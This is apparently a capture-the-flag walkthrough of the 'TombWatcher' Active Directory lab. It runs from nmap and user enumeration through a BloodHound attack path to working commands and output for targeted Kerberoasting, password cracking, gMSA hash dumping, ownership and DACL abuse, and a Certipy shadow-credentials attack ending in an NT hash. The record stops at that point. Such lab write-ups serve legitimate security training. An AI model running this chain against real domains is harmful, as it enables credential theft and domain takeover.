## HOST RECON

As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: henry / H3nry_987TGV!

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-10 08:14:07Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-10T08:15:34+00:00; +4h02m49s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
|_SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-10T08:15:34+00:00; +4h02m50s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
|_SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
|_SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
|_ssl-date: 2025-06-10T08:15:34+00:00; +4h02m49s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-10T08:15:34+00:00; +4h02m49s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
|_SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h02m49s, deviation: 0s, median: 4h02m48s
| smb2-time: 
|   date: 2025-06-10T08:14:54
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

- valid users

```
SMB         10.10.11.72     445    DC01             1103: TOMBWATCHER\Henry (SidTypeUser)
SMB         10.10.11.72     445    DC01             1104: TOMBWATCHER\Alfred (SidTypeUser)
SMB         10.10.11.72     445    DC01             1105: TOMBWATCHER\sam (SidTypeUser)
SMB         10.10.11.72     445    DC01             1106: TOMBWATCHER\john (SidTypeUser)
SMB         10.10.11.72     445    DC01             1107: TOMBWATCHER\Infrastructure (SidTypeGroup)
SMB         10.10.11.72     445    DC01             1108: TOMBWATCHER\ansible_dev$ (SidTypeUser)
```
```
henry
alfred
ansible_dev$
sam
john
administrator
```


## bh data

```
- henry ---> outbound ---> henry has WriteSPN over alfred (targeted kerberoasting)

- alfred ---> outbound ---> alfred has AddSelf over Infrastructure group 

- Infrastructure members has ReadGMSAPassword over ansible_dev$ comp account

- ansible_dev$ has ForceChangePassword over sam

- sam ---> outbound ---> sam has WriteOwner over john

To change the ownership of the object, you may use Impacket's owneredit example script (cf. "grant ownership" reference for the exact link).
owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'

To abuse ownership of a user object, you may grant yourself the GenericAll permission.
Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).
dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'

Targeted Kerberoast,  Force Change Password, Shadow Credentials attack 

- john ---> memberof ---> Remote Management Users
  |__ outbound ---> jonh has GenericAll over ADCS OU


Control of the Organization Unit

With full control of the OU, you may add a new ACE on the OU that will inherit down to the objects under that OU. Below are two options depending on how targeted you choose to be in this step:

Generic Descendent Object Takeover

The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket's dacledit (cf. "grant rights" reference for the link).

dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'OUDistinguishedName' 'domain'/'user':'password'

Now, the "JKOHLER" user will have full control of all descendent objects of each type.

Targeted Descendent Object Takeoever

If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. Refer to the Windows Abuse info for this.

Objects for which ACL inheritance is disabled

It is important to note that the compromise vector described above relies on ACL inheritance and will not work for objects with ACL inheritance disabled, such as objects protected by AdminSDHolder (attribute adminCount=1). This observation applies to any OU child user or computer with ACL inheritance disabled, including objects located in nested sub-OUs.

In such a situation, it may still be possible to exploit GenericAll permissions on an OU through an alternative attack vector. Indeed, with GenericAll permissions over an OU, you may make modifications to the gPLink attribute of the OU. The ability to alter the gPLink attribute of an OU may allow an attacker to apply a malicious Group Policy Object (GPO) to all of the OU's child user and computer objects (including the ones located in nested sub-OUs). This can be exploited to make said child objects execute arbitrary commands through an immediate scheduled task, thus compromising them.

Successful exploitation will require the possibility to add non-existing DNS records to the domain and to create machine accounts. Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the attack vector implementation is not trivial and will require some setup.

From a Linux machine, the gPLink manipulation attack vector may be exploited using the OUned.py tool. For a detailed outline of exploit requirements and implementation, you can refer to the article associated to the OUned.py tool.

Be mindful of the number of users and computers that are in the given OU as they all will attempt to fetch and apply the malicious GPO.

Alternatively, the ability to modify the gPLink attribute of an OU can be exploited in conjunction with write permissions on a GPO. In such a situation, an attacker could first inject a malicious scheduled task in the controlled GPO, and then link the GPO to the target OU through its gPLink attribute, making all child users and computers apply the malicious GPO and execute arbitrary commands.  
```


## Targeted Kerberoast over alfred

- https://github.com/ShutdownRepo/targetedKerberoast

```
└─$ faketime -f +4hr ./targetedKerberoast.py -v --dc-ip 10.10.11.72 -d tombwatcher.htb -u henry -p 'H3nry_987TGV!'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (Alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$18fbe01d900c66c558d2da552291abeb$b4dbcd389aa721f37cdf6d25842f522baac3491a250d541d32353f71e962ae106fac4842c96dcb97d05324558d8e2119dee21295d2ef8861a73638812de98ae6505f770381a2bdb409453c6f71b58d6531127b586731454123b5603889f3bd7a44ae2035fd081a5f71322ad0bbacd28814774439dfc6cdd626fbf484eaa00977413d6d1d5a204d0444dc29908c8482254b6b917042ea3b74f15816a39bdc35109e816f62eb8c57f9c705fbc549bb0add8bc1eab8b8a58806be1335034d2e729241012f790856db22f40f877cdcbaad0e79846d7dd96191535a826cd599932f40d74e4c2f2e8b2558118d1d12f7816bf989e7bea6cbb51016d69e3a079385319d93b970b9d147695bc3cad3ae45f8f265e5f0a88e628cdb03fb3964796b0d8db0fbdb4d55eb14374c49d2a87a6d2ebf048aff266f6600ae13c76705277d7ad9ebbc0bd0c262435c4e480172a160ba40b42fec08b2cc858de4a76a2f75e2b2c5bb8b69f53ab40a09c31ba0725c6e566505d299e83defd1b63b6613e7ea2fe579aa08923965b25fc60d3736949937d2ab70de53516dc449389aead7db6751c9ef9ad947549c01455e03e1eca577cbf253f743d179f86c030a0dd7a4de82fa2ed7f865dffc99ac10d917c799b1b42078de582574499f1d0069c676d5a71a0208983c58c37ccf3e89f29a5d8a40d94e07a544aa4db2d9bae2679027532878b26b42c64c613b388550e2f00967d6b71f77b435dba83c270e6011c1bda6df5505aeca25488dfa4b37b3983d2faf32d5f3b341ac07812c42f32da066d71702e351122958f9da50b741ca515bf6b1101933b4b7fd1456ec74178a112e18464883d3a1ccc37284fdff99b80fcecab946c146d3739af5ad73e13687fda86c06f262d51610363ee28f03b1770f8dabe52ddfc570608b84da48710520f5f0a96fb5da03da2734affbc55719ac9f02b3451e124484f494847f1d61ae5abc61648499f900870d4061b6c1ebcc8e2154126019949f137c9b6daa9433d3d77f352991c412e73b40e018f923f004c47a44e73a0821c437c3678a05e9fab2c119e049cfe7e5f4ad5dca3ffd0f25e675e401058af32baed58a1136a529d2518d6df2ae87b1ffa0d541691da75a38818e9e9ca39c8c3947ec1019849895eddb1d2501259b91ca5fef58ede5ec10095347eab25b3869a2ed602f67da7d0980ad9790a19494221a0dcbfe3d0576ce3bd7d627fc3c157cda7f3bf0dd3547f44e9ff385903bf6fb6d6a9b6ad466b0f2e6c2ffa112d2ee288e62fc57e81848232c5330c3227f1c390bd378b58752f5b601980bda6563234ac96978a5080ce1929ad35e899542ee6b66b20ce0426907cbeecddfc2aae739d38144a483a96a3e8fbd6174813ffbe5be1617d1e334d1b2a7e578b47670d2205638b347b2b3cc94654b24bcc5fa1801083876a08fa35e327757dc38da01c549be178c7ccb6c97f8d3004f
```

```
└─$ john alfred_hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 

basketball       (?)
```

## AddSelf over Infrastructure group and ReadGMSAPassword over ansible_dev$

- https://www.hackingarticles.in/addself-active-directory-abuse/
- https://www.netexec.wiki/ldap-protocol/dump-gmsa

```
└─$ bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u alfred -p basketball add groupMember "Infrastructure" alfred 
[+] alfred added to Infrastructure
```

```
└─$ netexec ldap 10.10.11.72 -u alfred -p basketball --gmsa
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.72     636    DC01             [+] tombwatcher.htb\alfred:basketball 
LDAPS       10.10.11.72     636    DC01             [*] Getting GMSA Passwords
LDAPS       10.10.11.72     636    DC01             Account: ansible_dev$         NTLM: 1c37d00093dc2a5f25176bf2d474afdc
```

## ForceChangePassword over sam and WriteOwner over john (later Targeted Kerberoast or Force Change Password or Shadow Credentials attack)

```
└─$ impacket-owneredit -action write -new-owner sam -target john 'tombwatcher.htb/sam:Pass123' -dc-ip 10.10.11.72
[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!
```

```
└─$ impacket-dacledit -action 'write' -rights 'FullControl' -principal sam -target john 'tombwatcher.htb/sam:Pass123' -dc-ip 10.10.11.72
[*] DACL backed up to dacledit-20250611-010935.bak
[*] DACL modified successfully!
```

```
└─$ faketime -f +4hr certipy shadow auto -dc-ip 10.10.11.72 -target tombwatcher.htb -u sam -p Pass123 -account john
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'john'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'e4e565d9-1506-4771-aa71-9ce92ab3fe29'
[*] Adding Key Credential with device ID 'e4e565d9-1506-4771-aa71-9ce92ab3fe29' to the Key Credentials for 'john'
[*] Successfully added Key Credential with device ID 'e4e565d9-1506-4771-aa71-9ce92ab3fe29' to the Key Credentials for 'john'
[*] Authenticating as 'john' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'john@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'john.ccache'
[*] Wrote credential cache to 'john.ccache'
[*] Trying to retrieve NT hash for 'john'
[*] Restoring the old Key Credentials for 'john'
[*] Successfully restored the old Key Credentials for 'john'
[*] NT hash for 'john': ad9324754583e3e42b55aad4d3b8d2bf
```


